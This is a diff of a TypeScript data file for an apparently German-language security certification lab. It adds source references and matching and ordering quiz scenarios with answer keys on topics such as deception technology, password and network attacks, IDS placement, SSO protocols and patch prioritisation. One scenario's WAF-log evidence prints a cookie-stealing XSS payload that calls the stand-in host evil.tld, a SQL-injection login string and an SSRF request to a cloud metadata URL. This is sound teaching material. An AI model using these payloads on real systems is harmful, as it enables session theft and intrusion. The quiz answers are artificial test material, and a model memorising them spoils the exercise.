@@ -68,6 +68,7 @@ export const LAB_CATEGORIES: LabCategory[] = [
   { id: 'firewalls', title: 'Firewalls & Netzwerk', subtitle: 'Regelwerke, Segmentierung, Zonen' },
   { id: 'architektur', title: 'Sichere Architektur', subtitle: 'Cloud, Resilienz, Datenzustände' },
   { id: 'iam', title: 'Identität & Zugriff', subtitle: 'AAA, MFA, Least Privilege' },
+  { id: 'betrieb', title: 'Security Operations', subtitle: 'Härtung, Schwachstellen, Monitoring, Automation' },
   { id: 'incident-response', title: 'Incident Response', subtitle: 'NIST-Lebenszyklus, Forensik, Logs' },
   { id: 'krypto', title: 'Kryptografie & PKI', subtitle: 'Hashing, TLS, Zertifikate' },
   { id: 'governance', title: 'Governance & Risiko', subtitle: 'Policies, Risk Management, Datenrollen' },
@@ -225,6 +226,150 @@ export const LAB_SOURCES: LabSource[] = [
     url: 'https://csrc.nist.gov/pubs/sp/800/88/r2/ipd',
     accessed: '2026-06-10',
     note: 'Aktuelle oeffentliche NIST-Fassung zu Media Sanitization und Entsorgungsentscheidungen.',
+  },
+  {
+    id: 'cis-benchmarks',
+    title: 'CIS Benchmarks',
+    publisher: 'Center for Internet Security',
+    url: 'https://www.cisecurity.org/cis-benchmarks',
+    accessed: '2026-06-11',
+    note: 'Konsens-Haertungs-Baselines fuer Betriebssysteme, Cloud-Dienste und Anwendungen.',
+  },
+  {
+    id: 'nist-sp-800-94',
+    title: 'NIST SP 800-94: Guide to Intrusion Detection and Prevention Systems (IDPS)',
+    publisher: 'NIST',
+    url: 'https://csrc.nist.gov/pubs/sp/800/94/final',
+    accessed: '2026-06-11',
+    note: 'IDS/IPS-Typen, Platzierung inline vs. passiv und Erkennungsmethoden.',
+  },
+  {
+    id: 'nist-sp-800-97',
+    title: 'NIST SP 800-97: Establishing Wireless Robust Security Networks',
+    publisher: 'NIST',
+    url: 'https://csrc.nist.gov/pubs/sp/800/97/final',
+    accessed: '2026-06-11',
+    note: '802.11i/WPA2, 802.1X/EAP-Authentisierung und Wireless-Sicherheitsarchitektur.',
+  },
+  {
+    id: 'wifi-alliance-security',
+    title: 'Wi-Fi CERTIFIED Security (WPA3, Enhanced Open)',
+    publisher: 'Wi-Fi Alliance',
+    url: 'https://www.wi-fi.org/discover-wi-fi/security',
+    accessed: '2026-06-11',
+    note: 'WPA3-Personal/Enterprise, SAE und Enhanced Open (OWE) als aktuelle WLAN-Standards.',
+  },
+  {
+    id: 'nist-sp-800-124r2',
+    title: 'NIST SP 800-124 Rev. 2: Guidelines for Managing the Security of Mobile Devices in the Enterprise',
+    publisher: 'NIST',
+    url: 'https://csrc.nist.gov/pubs/sp/800/124/r2/final',
+    accessed: '2026-06-11',
+    note: 'Mobile-Deployment-Modelle (BYOD/COPE/CYOD) und MDM/EMM-Schutzmassnahmen.',
+  },
+  {
+    id: 'nist-sp-800-40r4',
+    title: 'NIST SP 800-40 Rev. 4: Guide to Enterprise Patch Management Planning',
+    publisher: 'NIST',
+    url: 'https://csrc.nist.gov/pubs/sp/800/40/r4/final',
+    accessed: '2026-06-11',
+    note: 'Patch- und Schwachstellen-Remediation als Routine- und Notfallprozess.',
+  },
+  {
+    id: 'first-cvss-v31',
+    title: 'CVSS v3.1 Specification Document',
+    publisher: 'FIRST',
+    url: 'https://www.first.org/cvss/v3.1/specification-document',
+    accessed: '2026-06-11',
+    note: 'CVSS-Metriken und Severity-Bewertung von Schwachstellen.',
+  },
+  {
+    id: 'cisa-kev',
+    title: 'Known Exploited Vulnerabilities Catalog',
+    publisher: 'CISA',
+    url: 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog',
+    accessed: '2026-06-11',
+    note: 'Aktiv ausgenutzte CVEs als Priorisierungssignal fuer die Remediation.',
+  },
+  {
+    id: 'nist-sp-800-115',
+    title: 'NIST SP 800-115: Technical Guide to Information Security Testing and Assessment',
+    publisher: 'NIST',
+    url: 'https://csrc.nist.gov/pubs/sp/800/115/final',
+    accessed: '2026-06-11',
+    note: 'Scan-, Test- und Assessment-Methoden inkl. Penetrationstest-Phasen.',
+  },
+  {
+    id: 'nist-sp-800-92',
+    title: 'NIST SP 800-92: Guide to Computer Security Log Management',
+    publisher: 'NIST',
+    url: 'https://csrc.nist.gov/pubs/sp/800/92/final',
+    accessed: '2026-06-11',
+    note: 'Log-Aggregation, -Analyse und Aufbewahrung als Monitoring-Grundlage.',
+  },
+  {
+    id: 'nist-sp-800-177r1',
+    title: 'NIST SP 800-177 Rev. 1: Trustworthy Email',
+    publisher: 'NIST',
+    url: 'https://csrc.nist.gov/pubs/sp/800/177/r1/final',
+    accessed: '2026-06-11',
+    note: 'E-Mail-Authentisierung mit SPF, DKIM und DMARC gegen Spoofing.',
+  },
+  {
+    id: 'nist-sp-800-82r3',
+    title: 'NIST SP 800-82 Rev. 3: Guide to Operational Technology (OT) Security',
+    publisher: 'NIST',
+    url: 'https://csrc.nist.gov/pubs/sp/800/82/r3/final',
+    accessed: '2026-06-11',
+    note: 'Absicherung von ICS/SCADA- und OT-Umgebungen inkl. Segmentierung.',
+  },
+  {
+    id: 'nist-sp-800-63c',
+    title: 'NIST SP 800-63C: Digital Identity Guidelines, Federation and Assertions',
+    publisher: 'NIST',
+    url: 'https://csrc.nist.gov/pubs/sp/800/63/c/upd2/final',
+    accessed: '2026-06-11',
+    note: 'Federation-Modelle, Assertions und Vertrauensbeziehungen zwischen IdP und RP.',
+  },
+  {
+    id: 'nist-sp-800-84',
+    title: 'NIST SP 800-84: Guide to Test, Training, and Exercise Programs for IT Plans and Capabilities',
+    publisher: 'NIST',
+    url: 'https://csrc.nist.gov/pubs/sp/800/84/final',
+    accessed: '2026-06-11',
+    note: 'Tabletop-Uebungen, funktionale Tests und Exercise-Programme fuer IR-/BC-Plaene.',
+  },
+  {
+    id: 'nist-sp-800-30r1',
+    title: 'NIST SP 800-30 Rev. 1: Guide for Conducting Risk Assessments',
+    publisher: 'NIST',
+    url: 'https://csrc.nist.gov/pubs/sp/800/30/r1/final',
+    accessed: '2026-06-11',
+    note: 'Risiko-Assessment, Likelihood/Impact und Dokumentation von Risiken.',
+  },
+  {
+    id: 'eu-gdpr',
+    title: 'Regulation (EU) 2016/679 (GDPR)',
+    publisher: 'EUR-Lex / Europaeische Union',
+    url: 'https://eur-lex.europa.eu/eli/reg/2016/679/oj',
+    accessed: '2026-06-11',
+    note: 'Rollen Controller/Processor, Betroffenenrechte und Meldepflichten bei Datenpannen.',
+  },
+  {
+    id: 'mitre-engage',
+    title: 'MITRE Engage',
+    publisher: 'MITRE',
+    url: 'https://engage.mitre.org/',
+    accessed: '2026-06-11',
+    note: 'Adversary-Engagement- und Taeuschungs-Techniken wie Honeypots und Decoys.',
+  },
+  {
+    id: 'owasp-credential-stuffing',
+    title: 'Credential Stuffing Prevention Cheat Sheet',
+    publisher: 'OWASP Foundation',
+    url: 'https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html',
+    accessed: '2026-06-11',
+    note: 'Abgrenzung Credential Stuffing, Password Spraying und Brute Force samt Abwehr.',
   },
 ]
 
@@ -418,6 +563,29 @@ export const LAB_SCENARIOS: LabScenario[] = [
     },
   },
 
+  {
+    id: 'grundlagen-deception-tech',
+    categoryId: 'grundlagen',
+    title: 'Honeypot, Honeynet oder Honeytoken?',
+    objective: '1.2 Fundamental Security Concepts',
+    difficulty: 'fortgeschritten',
+    minutes: 4,
+    description:
+      'Das SOC will Angreifer frueh erkennen, ohne Produktionssysteme zu riskieren. Ordne jedem Einsatzzweck die passende Deception-Technologie zu.',
+    evidence:
+      'Anforderungen aus dem SOC-Workshop:\n  A. Einzelnes Fake-System, das SSH-Login-Versuche anlockt und protokolliert\n  B. Ganze simulierte Netzwerkumgebung mit mehreren Decoy-Systemen\n  C. Gefaelschte API-Credentials im Code-Repo, Alarm bei Verwendung\n  D. Unauffaellige Datei "Gehaelter_2026.xlsx" auf dem Fileserver, Alarm bei Zugriff',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'A: einzelnes Fake-System fuer SSH-Angriffe', right: 'Honeypot' },
+        { left: 'B: simulierte Umgebung aus mehreren Decoys', right: 'Honeynet' },
+        { left: 'C: gefaelschte Credentials mit Alarm', right: 'Honeytoken' },
+        { left: 'D: praeparierte Datei mit Zugriffs-Alarm', right: 'Honeyfile' },
+      ],
+      options: ['Honeypot', 'Honeynet', 'Honeytoken', 'Honeyfile'],
+    },
+  },
+
   // ── Bedrohungen & Angriffe (⚠️ neu generiert) ─────────────────────────────
   {
     id: 'bedrohungen-threat-actors',
@@ -454,7 +622,7 @@ export const LAB_SCENARIOS: LabScenario[] = [
         { left: 'SMS "Ihr Paket wartet" mit Link an alle Mitarbeiter', right: 'Smishing' },
         { left: 'Anruf vom "IT-Support", der das Passwort braucht', right: 'Vishing' },
         { left: 'Mail an die Buchhaltung, angeblich vom CEO, Zahlung dringend', right: 'Business Email Compromise (BEC)' },
-        { left: 'Praeparierte Website, die das Branchenportal imitiert', right: 'Watering Hole' },
+        { left: 'Haeufig besuchtes Branchenportal kompromittiert, verteilt Malware', right: 'Watering Hole' },
       ],
       options: ['Smishing', 'Vishing', 'Business Email Compromise (BEC)', 'Watering Hole'],
     },
@@ -602,6 +770,73 @@ export const LAB_SCENARIOS: LabScenario[] = [
         'Segmentierung + ACLs',
         'Phishing-resistente MFA + Passwortwechsel',
       ],
+    },
+  },
+
+  {
+    id: 'bedrohungen-passwort-angriffe',
+    categoryId: 'bedrohungen',
+    title: 'Passwort-Angriff am Log erkennen',
+    objective: '2.4 Indicators of Malicious Activity',
+    difficulty: 'fortgeschritten',
+    minutes: 4,
+    description:
+      'Vier Auth-Log-Muster aus einer Nacht. Ordne jedem Muster den Passwort-Angriff zu, der am besten passt.',
+    evidence:
+      'Auth-Log (aggregiert):\n  A. 40.000 Logins auf viele Accounts, je GENAU 1 Versuch mit Passwort "Winter2026!"\n  B. 1 Account, 90.000 Versuche, Woerterbuch plus Mutationen\n  C. 12.000 Logins mit E-Mail/Passwort-Paaren aus einem fremden Breach-Dump, ~1% Treffer\n  D. NTLM-Hash wird ohne Klartext-Passwort direkt zur Authentisierung wiederverwendet',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'A: ein Passwort gegen viele Accounts', right: 'Password Spraying' },
+        { left: 'B: viele Versuche gegen einen Account', right: 'Brute Force / Dictionary' },
+        { left: 'C: Breach-Paare massenhaft durchprobiert', right: 'Credential Stuffing' },
+        { left: 'D: Hash statt Passwort wiederverwendet', right: 'Pass-the-Hash' },
+      ],
+      options: ['Password Spraying', 'Brute Force / Dictionary', 'Credential Stuffing', 'Pass-the-Hash'],
+    },
+  },
+  {
+    id: 'bedrohungen-netzwerk-angriffe',
+    categoryId: 'bedrohungen',
+    title: 'Netzwerk-Angriff aus dem Befund',
+    objective: '2.4 Malicious Activity',
+    difficulty: 'fortgeschritten',
+    minutes: 4,
+    description:
+      'Vier Netzwerk-Befunde aus dem NOC. Ordne jedem Befund den Angriffstyp zu, den die Symptome belegen.',
+    evidence:
+      'Befunde:\n  A. Tausende SYN-Pakete von gespooften Quellen, Backlog voll, Webshop nicht erreichbar\n  B. Clients loesen bank-beispiel.de ploetzlich zu einer fremden IP auf; Resolver-Cache manipuliert\n  C. Im Gaeste-WLAN beantwortet ein fremdes Geraet ARP-Anfragen fuer das Gateway\n  D. Angreifer wiederholt einen mitgeschnittenen, gueltigen Session-Token gegen die API',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'A: SYN-Flut von gespooften Quellen', right: 'DDoS / SYN-Flood' },
+        { left: 'B: manipulierte Namensaufloesung im Resolver', right: 'DNS-(Cache-)Poisoning' },
+        { left: 'C: fremdes Geraet gibt sich als Gateway aus', right: 'On-Path via ARP-Spoofing' },
+        { left: 'D: mitgeschnittener Token wiederverwendet', right: 'Replay-Angriff' },
+      ],
+      options: ['DDoS / SYN-Flood', 'DNS-(Cache-)Poisoning', 'On-Path via ARP-Spoofing', 'Replay-Angriff'],
+    },
+  },
+  {
+    id: 'bedrohungen-web-app-angriffe',
+    categoryId: 'bedrohungen',
+    title: 'Web-Angriff im Request erkennen',
+    objective: '2.4 Malicious Activity',
+    difficulty: 'experte',
+    minutes: 5,
+    description:
+      'Vier verdaechtige Requests aus dem WAF-Log. Ordne jedem Request die Angriffsklasse zu, die er ausnutzt.',
+    evidence:
+      'WAF-Log:\n  A. GET /login?user=admin\'--&pass=x\n  B. POST /profil Kommentar: <script>fetch("https://evil.tld/c?d="+document.cookie)</script>\n  C. GET /api/rechnungen/4711 liefert eine fremde Rechnung — ID einfach hochgezaehlt\n  D. GET /export?url=http://169.254.169.254/latest/meta-data/ — abgerufen vom Server selbst',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'A: \'-- im Login-Parameter', right: 'SQL-Injection' },
+        { left: 'B: Script-Tag im Kommentarfeld', right: 'Cross-Site Scripting (XSS)' },
+        { left: 'C: fremde Rechnung per ID-Hochzaehlen', right: 'Broken Access Control / IDOR' },
+        { left: 'D: Server ruft interne Metadaten-URL ab', right: 'Server-Side Request Forgery (SSRF)' },
+      ],
+      options: ['SQL-Injection', 'Cross-Site Scripting (XSS)', 'Broken Access Control / IDOR', 'Server-Side Request Forgery (SSRF)'],
     },
   },
 
@@ -882,6 +1117,51 @@ export const LAB_SCENARIOS: LabScenario[] = [
     },
   },
 
+  {
+    id: 'firewalls-ids-ips-platzierung',
+    categoryId: 'firewalls',
+    title: 'IDS oder IPS — Sensor richtig setzen',
+    objective: '4.5 Enterprise Security',
+    difficulty: 'fortgeschritten',
+    minutes: 4,
+    description:
+      'Vier Anforderungen aus dem Netzwerk-Redesign. Ordne jeder Anforderung den passenden Sensor-Modus bzw. die Platzierung zu.',
+    topology: 'Internet -> [FW] -> (a) Inline-Sensor -> Core-Switch -(SPAN/TAP)-> (b) passiver Sensor | Host: (c) Agent',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'Bekannte Exploits sollen aktiv geblockt werden', right: 'IPS inline hinter der Firewall' },
+        { left: 'Nur beobachten, kein Risiko fuer den Traffic-Fluss', right: 'IDS passiv am SPAN/TAP' },
+        { left: 'Prozess- und Dateiverhalten auf dem Server selbst', right: 'Host-basiertes IDS / EDR-Agent' },
+        { left: 'Unbekannte Abweichungen vom Normalverkehr melden', right: 'Anomalie-/Baseline-Erkennung' },
+      ],
+      options: ['IPS inline hinter der Firewall', 'IDS passiv am SPAN/TAP', 'Host-basiertes IDS / EDR-Agent', 'Anomalie-/Baseline-Erkennung'],
+    },
+  },
+  {
+    id: 'firewalls-nac-8021x',
+    categoryId: 'firewalls',
+    title: '802.1X/NAC: Port-Zutritt im Ablauf',
+    objective: '4.5 Enterprise Security',
+    difficulty: 'experte',
+    minutes: 5,
+    description:
+      'Am Access-Switch wird 802.1X mit NAC-Posture-Check eingefuehrt. Bring den Ablauf vom Einstecken des Kabels bis zum produktiven Zugriff in die richtige Reihenfolge.',
+    topology: 'Client (Supplicant) -> Access-Switch (Authenticator) -> RADIUS (Authentication Server) -> NAC/Policy',
+    goal: 'Ziel: Erst authentisieren, dann Health pruefen, erst danach ins Ziel-VLAN — nicht umgekehrt.',
+    interaction: {
+      type: 'ordering',
+      steps: [
+        'Switch weist das Geraet dem Ziel-VLAN zu, produktiver Zugriff beginnt',
+        'Client steckt ein; Port ist unauthenticated und laesst nur EAPOL durch',
+        'NAC prueft die Posture (Patchstand, EDR aktiv); bei Fail: Quarantaene-VLAN',
+        'RADIUS prueft die Identitaet (Zertifikat/Credentials) via EAP',
+        'Supplicant sendet seine Identitaet als Antwort auf den EAP-Request',
+      ],
+      correctOrder: [1, 4, 3, 2, 0],
+    },
+  },
+
   // ── Sichere Architektur (⚠️ neu generiert) ────────────────────────────────
   {
     id: 'architektur-cloud-modelle',
@@ -1072,6 +1352,60 @@ export const LAB_SCENARIOS: LabScenario[] = [
     },
   },
 
+  {
+    id: 'architektur-ot-ics-iot',
+    categoryId: 'architektur',
+    title: 'OT, ICS & IoT richtig einordnen',
+    objective: '3.1 Architecture Models',
+    difficulty: 'fortgeschritten',
+    minutes: 4,
+    description:
+      'Die Werks-IT inventarisiert Spezialsysteme. Ordne jedem System die Klasse zu, deren Sicherheits-Eigenheiten du beachten musst.',
+    evidence:
+      'Inventar Werk 2:\n  A. SPS steuert die Abfuellanlage in Echtzeit\n  B. Leitstand visualisiert und steuert verteilte Pumpstationen ueber WAN\n  C. Smarte Ueberwachungskameras mit Cloud-Anbindung, Default-Passwort\n  D. Aufzugsteuerung mit festem OS-Image, Hersteller-Update nur alle 2 Jahre',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'A: SPS in der Echtzeit-Steuerung', right: 'ICS/PLC — Verfuegbarkeit vor Patching' },
+        { left: 'B: Leitstand steuert Stationen ueber WAN', right: 'SCADA — segmentieren, Fernzugriff haerten' },
+        { left: 'C: Cloud-Kameras mit Default-Passwort', right: 'IoT — Credentials aendern, eigenes VLAN' },
+        { left: 'D: festes Image, seltene Updates', right: 'Embedded — kompensierende Controls noetig' },
+      ],
+      options: [
+        'ICS/PLC — Verfuegbarkeit vor Patching',
+        'SCADA — segmentieren, Fernzugriff haerten',
+        'IoT — Credentials aendern, eigenes VLAN',
+        'Embedded — kompensierende Controls noetig',
+      ],
+    },
+  },
+  {
+    id: 'architektur-failure-modes',
+    categoryId: 'architektur',
+    title: 'Fail-Open oder Fail-Closed?',
+    objective: '3.1 Architecture Models',
+    difficulty: 'experte',
+    minutes: 4,
+    description:
+      'Vier Sicherheitskomponenten brauchen ein definiertes Verhalten im Fehlerfall. Ordne jeder Komponente den passenden Failure-Mode samt Begruendung zu.',
+    goal: 'Ziel: Sicherheit vs. Verfuegbarkeit pro Komponente bewusst abwaegen — nicht pauschal entscheiden.',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'Tuerschliesssystem am RZ-Notausgang', right: 'Fail-Open — Personenschutz geht vor' },
+        { left: 'Inline-IPS vor dem unkritischen Gaeste-WLAN', right: 'Fail-Open — Verfuegbarkeit akzeptiert, Risiko gering' },
+        { left: 'Firewall vor dem Zahlungs-Backend', right: 'Fail-Closed — kein ungefilterter Traffic' },
+        { left: 'Passiver IDS-Sensor am TAP', right: 'Kein Impact — Monitoring faellt aus, Traffic laeuft' },
+      ],
+      options: [
+        'Fail-Open — Personenschutz geht vor',
+        'Fail-Open — Verfuegbarkeit akzeptiert, Risiko gering',
+        'Fail-Closed — kein ungefilterter Traffic',
+        'Kein Impact — Monitoring faellt aus, Traffic laeuft',
+      ],
+    },
+  },
+
   // ── Identität & Zugriff (⚠️ neu generiert) ────────────────────────────────
   {
     id: 'iam-aaa',
@@ -1248,6 +1582,342 @@ export const LAB_SCENARIOS: LabScenario[] = [
     },
   },
 
+  {
+    id: 'iam-sso-protokolle',
+    categoryId: 'iam',
+    title: 'SAML, OIDC, OAuth oder LDAP?',
+    objective: '4.6 Identity and Access Management',
+    difficulty: 'fortgeschritten',
+    minutes: 4,
+    description:
+      'Vier Integrations-Anforderungen aus dem IAM-Backlog. Ordne jeder Anforderung das passende Protokoll zu.',
+    evidence:
+      'Backlog:\n  A. Browser-SSO in eine Enterprise-Webapp ueber XML-Assertions des IdP\n  B. Mobile App soll im Namen des Users auf die Kalender-API zugreifen — ohne Passwort-Weitergabe\n  C. Login "Sign in with …" inkl. ID-Token mit Identitaets-Claims (JWT)\n  D. Legacy-App prueft Gruppenmitgliedschaften direkt im Verzeichnisdienst',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'A: XML-Assertions fuer Browser-SSO', right: 'SAML 2.0' },
+        { left: 'B: delegierter API-Zugriff ohne Passwort', right: 'OAuth 2.0 (Authorization)' },
+        { left: 'C: ID-Token mit Claims als JWT', right: 'OpenID Connect' },
+        { left: 'D: Verzeichnis-Lookup der Gruppen', right: 'LDAP(S)' },
+      ],
+      options: ['SAML 2.0', 'OAuth 2.0 (Authorization)', 'OpenID Connect', 'LDAP(S)'],
+    },
+  },
+  {
+    id: 'iam-passwort-richtlinie',
+    categoryId: 'iam',
+    title: 'Passwort-Policy nach NIST 800-63B',
+    objective: '4.6 Identity and Access Management',
+    difficulty: 'fortgeschritten',
+    minutes: 4,
+    description:
+      'Der Helpdesk eskaliert Beschwerden ueber die alte Passwort-Policy. Ordne jeder Alt-Regel die zeitgemaesse Praxis nach NIST SP 800-63B zu.',
+    evidence:
+      'Alte Policy (Stand 2014):\n  A. Passwortwechsel alle 60 Tage erzwungen\n  B. Pflicht: Sonderzeichen + Zahl + Gross/Klein in jedem Passwort\n  C. Maximal 16 Zeichen, Passphrasen nicht moeglich\n  D. Nach 3 Fehlversuchen dauerhafte Kontosperre, nur manuell aufhebbar',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'A: erzwungener 60-Tage-Wechsel', right: 'Nur bei Kompromittierungs-Verdacht wechseln' },
+        { left: 'B: erzwungene Komplexitaets-Regeln', right: 'Laenge + Blocklist statt Kompositionsregeln' },
+        { left: 'C: 16-Zeichen-Limit', right: 'Lange Passphrasen erlauben (64+ Zeichen)' },
+        { left: 'D: dauerhafte Sperre nach 3 Versuchen', right: 'Throttling/Rate-Limit statt Hard-Lockout' },
+      ],
+      options: [
+        'Nur bei Kompromittierungs-Verdacht wechseln',
+        'Laenge + Blocklist statt Kompositionsregeln',
+        'Lange Passphrasen erlauben (64+ Zeichen)',
+        'Throttling/Rate-Limit statt Hard-Lockout',
+      ],
+    },
+  },
+
+  // ── Security Operations (⚠️ neu generiert 2026-06-11) ─────────────────────
+  {
+    id: 'betrieb-server-haertung',
+    categoryId: 'betrieb',
+    title: 'Neuen Server nach Baseline haerten',
+    objective: '4.1 Securing Computing Resources',
+    difficulty: 'fortgeschritten',
+    minutes: 5,
+    description:
+      'Ein frisch installierter Webserver soll in die DMZ. Bring die Haertungs-Schritte in die richtige Reihenfolge — von der Installation bis zur Freigabe.',
+    evidence:
+      'OPS-Runbook:\n  - CIS-Benchmark als verbindliche Baseline vereinbart\n  - Server traegt noch Default-Konfiguration und alle Standard-Dienste',
+    interaction: {
+      type: 'ordering',
+      steps: [
+        // Strikt sequenziell: installieren -> haerten -> verifizieren ->
+        // freigeben -> betreiben (Host-FW/Logging gehoeren ZUM Benchmark-Schritt,
+        // sonst waere die Reihenfolge mehrdeutig).
+        'Compliance-Scan gegen die Baseline laufen lassen, Abweichungen beheben',
+        'Aktuelles OS-Image installieren und alle Patches einspielen',
+        'In der DMZ produktiv schalten und auf Konfigurations-Drift ueberwachen',
+        'CIS-Benchmark anwenden: Dienste, Default-Konten, Host-Firewall, Logging',
+        'Dokumentierte Freigabe einholen',
+      ],
+      correctOrder: [1, 3, 0, 4, 2],
+    },
+  },
+  {
+    id: 'betrieb-wlan-sicherheit',
+    categoryId: 'betrieb',
+    title: 'WLAN-Modus zum Einsatzzweck',
+    objective: '4.1 Securing Computing Resources',
+    difficulty: 'fortgeschritten',
+    minutes: 4,
+    description:
+      'Das Buero-WLAN wird neu aufgesetzt. Ordne jedem Einsatzzweck den passenden Sicherheits-Modus zu.',
+    evidence:
+      'Anforderungen:\n  A. Mitarbeiter-WLAN: Authentisierung pro User ueber RADIUS mit Zertifikaten\n  B. Buero-Gaeste: Passphrase, aber moderner Schutz gegen Offline-Cracking\n  C. Altgeraete im Lager koennen nur WPA2-Personal\n  D. Offenes Event-WLAN soll trotzdem pro Client verschluesseln',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'A: User-Auth via RADIUS/Zertifikat', right: 'WPA3-Enterprise (802.1X/EAP-TLS)' },
+        { left: 'B: Passphrase mit modernem Schutz', right: 'WPA3-Personal (SAE)' },
+        { left: 'C: Altgeraete ohne WPA3-Support', right: 'WPA2-Personal in eigenem VLAN' },
+        { left: 'D: offen, aber pro Client verschluesselt', right: 'Enhanced Open (OWE)' },
+      ],
+      options: ['WPA3-Enterprise (802.1X/EAP-TLS)', 'WPA3-Personal (SAE)', 'WPA2-Personal in eigenem VLAN', 'Enhanced Open (OWE)'],
+    },
+  },
+  {
+    id: 'betrieb-mobile-deployment',
+    categoryId: 'betrieb',
+    title: 'BYOD, COPE oder CYOD?',
+    objective: '4.1 Securing Computing Resources',
+    difficulty: 'einsteiger',
+    minutes: 4,
+    description:
+      'Die Mobile-Strategie wird neu aufgesetzt. Ordne jedem Geraete-Szenario das passende Deployment-Modell bzw. die MDM-Massnahme zu.',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'Privates Handy, Firmen-Apps nur im Container', right: 'BYOD mit MDM-Workprofil' },
+        { left: 'Firmengeraet, private Nutzung ausdruecklich erlaubt', right: 'COPE' },
+        { left: 'Mitarbeiter waehlt aus einer Liste verwalteter Firmengeraete', right: 'CYOD' },
+        { left: 'Verlorenes Geraet mit Firmendaten', right: 'Remote Wipe ueber MDM' },
+      ],
+      options: ['BYOD mit MDM-Workprofil', 'COPE', 'CYOD', 'Remote Wipe ueber MDM'],
+    },
+  },
+  {
+    id: 'betrieb-asset-lifecycle',
+    categoryId: 'betrieb',
+    title: 'Asset-Lebenszyklus ohne Luecken',
+    objective: '4.2 Asset Management',
+    difficulty: 'einsteiger',
+    minutes: 4,
+    description:
+      'Das Audit bemaengelt Geraete, die nie inventarisiert oder nie sauber entsorgt wurden. Bring den Asset-Lebenszyklus in die richtige Reihenfolge.',
+    interaction: {
+      type: 'ordering',
+      steps: [
+        'Nutzung ueberwachen: Ownership, Standort und Patch-Status pflegen',
+        'Beschaffung: Geraet ueber den freigegebenen Prozess kaufen',
+        'Sanitisieren und Entsorgung/Verwertung mit Nachweis-Zertifikat',
+        'Inventarisieren: Asset-Tag, Owner und Klassifizierung in der CMDB',
+        'Ausserbetriebnahme beantragen, Daten sichern bzw. migrieren',
+      ],
+      correctOrder: [1, 3, 0, 4, 2],
+    },
+  },
+  {
+    id: 'betrieb-vuln-priorisierung',
+    categoryId: 'betrieb',
+    title: 'Schwachstellen richtig priorisieren',
+    objective: '4.3 Vulnerability Management',
+    difficulty: 'experte',
+    minutes: 5,
+    description:
+      'Der Wochen-Scan liefert vier Findings. Ordne jedem Finding die richtige Priorisierung zu — der CVSS-Score allein entscheidet nicht.',
+    evidence:
+      'Scan-Report KW 24:\n  A. CVE am Internet-Portal, CVSS 9.8, steht in der CISA-KEV-Liste\n  B. CVSS 7.5 auf internem Server, Exploit nur mit lokalem Account moeglich\n  C. CVSS 9.1 auf isoliertem Laborsystem ohne Netzanbindung\n  D. CVSS 5.3 am Webshop, aber Voraussetzung fuer eine bekannte Exploit-Kette',
+    goal: 'Ziel: Exploitability, Exposition und Kontext schlagen den reinen CVSS-Score.',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'A: 9.8, KEV-gelistet, internetexponiert', right: 'Sofort patchen (Emergency Change)' },
+        { left: 'B: 7.5, nur mit lokalem Account', right: 'Regulaerer Patch-Zyklus' },
+        { left: 'C: 9.1, aber isoliertes Laborsystem', right: 'Risiko dokumentieren, niedrige Prioritaet' },
+        { left: 'D: 5.3, Teil einer Exploit-Kette', right: 'Hochstufen: Kette bewerten, zeitnah patchen' },
+      ],
+      options: [
+        'Sofort patchen (Emergency Change)',
+        'Regulaerer Patch-Zyklus',
+        'Risiko dokumentieren, niedrige Prioritaet',
+        'Hochstufen: Kette bewerten, zeitnah patchen',
+      ],
+    },
+  },
+  {
+    id: 'betrieb-patch-notfall',
+    categoryId: 'betrieb',
+    title: 'Emergency-Patch ohne Blindflug',
+    objective: '4.3 Vulnerability Management',
+    difficulty: 'fortgeschritten',
+    minutes: 5,
+    description:
+      'Ein aktiv ausgenutzter Zero-Day im VPN-Gateway ist bestaetigt. Bring die Remediation-Schritte in die richtige Reihenfolge.',
+    evidence:
+      'Vendor-Advisory:\n  - Hotfix verfuegbar; Workaround: betroffenes Feature deaktivieren\n  - CISA: aktive Ausnutzung bestaetigt (KEV)\n  - Kontext: 800 Remote-User nutzen das Gateway waehrend der Geschaeftszeit',
+    interaction: {
+      type: 'ordering',
+      steps: [
+        'Hotfix zuerst in Staging gegen die Kernfunktionen testen',
+        'Exposition pruefen: betroffene Version? Feature aktiv? Logs auf IoCs sichten',
+        'Emergency Change beantragen und Workaround sofort aktivieren',
+        'Hotfix in Produktion ausrollen und Funktion validieren',
+        'Scan wiederholen, Remediation dokumentieren, Lessons Learned festhalten',
+      ],
+      correctOrder: [1, 2, 0, 3, 4],
+    },
+  },
+  {
+    id: 'betrieb-scan-arten',
+    categoryId: 'betrieb',
+    title: 'Scan oder Pentest — was liefert was?',
+    objective: '4.3 Vulnerability Management',
+    difficulty: 'einsteiger',
+    minutes: 4,
+    description:
+      'Das Management wuenscht "einen Sicherheitstest". Ordne jeder Frage die Methode zu, die sie tatsaechlich beantwortet.',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'Welche bekannten CVEs sind von aussen sichtbar?', right: 'Nicht-authentifizierter Vulnerability-Scan' },
+        { left: 'Fehlen Patches oder Configs auf dem Server selbst?', right: 'Authentifizierter (Credentialed) Scan' },
+        { left: 'Kann ein Angreifer die Luecken real verketten?', right: 'Penetrationstest' },
+        { left: 'Stimmen Prozesse und Doku mit der Policy ueberein?', right: 'Audit / Assessment' },
+      ],
+      options: [
+        'Nicht-authentifizierter Vulnerability-Scan',
+        'Authentifizierter (Credentialed) Scan',
+        'Penetrationstest',
+        'Audit / Assessment',
+      ],
+    },
+  },
+  {
+    id: 'betrieb-siem-tuning',
+    categoryId: 'betrieb',
+    title: 'SIEM-Alerts richtig einordnen',
+    objective: '4.4 Alerting and Monitoring',
+    difficulty: 'fortgeschritten',
+    minutes: 4,
+    description:
